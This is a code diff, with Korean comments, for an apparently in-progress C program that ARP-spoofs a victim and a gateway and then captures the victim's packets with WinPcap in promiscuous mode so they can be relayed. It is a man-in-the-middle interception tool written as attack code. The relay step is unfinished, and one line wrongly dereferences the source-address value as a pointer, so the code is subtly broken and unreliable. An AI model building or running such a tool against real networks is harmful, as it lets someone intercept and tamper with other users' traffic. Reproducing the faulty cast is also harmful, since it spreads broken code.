@@ -68,8 +68,8 @@ typedef struct ip_header {
 	u_char ttl;
 	u_char proto;
 	u_short crc;
-	ip_address saddr;
-	ip_address daddr;
+	u_long saddr;
+	u_long daddr;
 	u_int op_pad;
 }IP_HDR;
 
@@ -86,6 +86,50 @@ typedef struct spoofparam {
 // victim으로 부터 받은 패킷을 게이트웨이로 전송
 unsigned int WINAPI RelayVictim2Gate(LPVOID lpParam) {
 	// victim으로 부터 도착한 것이 맞는지 확인? 맥 어드레스
+	pcap_t* pkt;
+	struct pcap_pkthdr *pkt_header;
+	const u_char *pkt_data;
+	pcap_if_t *dev;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	int res;
+
+	SPOOFPARAM spoofdata = *(SPOOFPARAM*)lpParam;
+
+	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &dev, errbuf) == -1)
+	{
+		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
+		exit(1);
+	}
+
+	if ((pkt = pcap_open(dev->name,          
+		65536,         
+		PCAP_OPENFLAG_PROMISCUOUS, 
+		1,
+		NULL,           
+		errbuf           
+	)) == NULL)
+	{
+		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", dev->name);
+		pcap_freealldevs(dev);
+		return -1;
+	}
+
+	while ((res = pcap_next_ex(pkt, &pkt_header, &pkt_data)) >= 0) {
+		if (res == 0)
+			continue;
+
+		ETHER_HDR *chkarp = (ETHER_HDR*)pkt_data;
+		if (ntohs(chkarp->ether_type) != ETHERTYPE_IP) continue;
+
+		IP_HDR * chkpkt = (IP_HDR*)(pkt_data + ETH_HDRLEN);
+
+		if ((*(unsigned int*)chkpkt->saddr) == inet_addr(spoofdata.target_ip)) {
+			/*보내는 ip가 타겟의 ip와 같으므로 타겟이 보낸 패킷!! 이 패킷을 원래 목적지로 보내줘야 함.*/
+
+			break;
+		}
+	}
+
 	return 0;
 }
 
@@ -378,8 +422,11 @@ int main(int argc, char *argv[])
 	unsigned spoof_victim_id;
 	unsigned spoof_gateway_id;
 
+	/* send arp 과정 :: 이거 끝나면 victim의 패킷이 나안테 오게 됨 */
 	hSpoofVictim = (HANDLE)_beginthreadex(NULL, 0, &spoofVictim, &sVictim, 0, &spoof_victim_id);
 	hSpoofGateway = (HANDLE)_beginthreadex(NULL, 0, &spoofGateway, &sGateway, 0, &spoof_gateway_id);
+
+	/* 나에게 도착한 victim의 패킷을 */
 
 	WaitForSingleObject(hSpoofVictim, INFINITE);
 	WaitForSingleObject(hSpoofGateway, INFINITE);
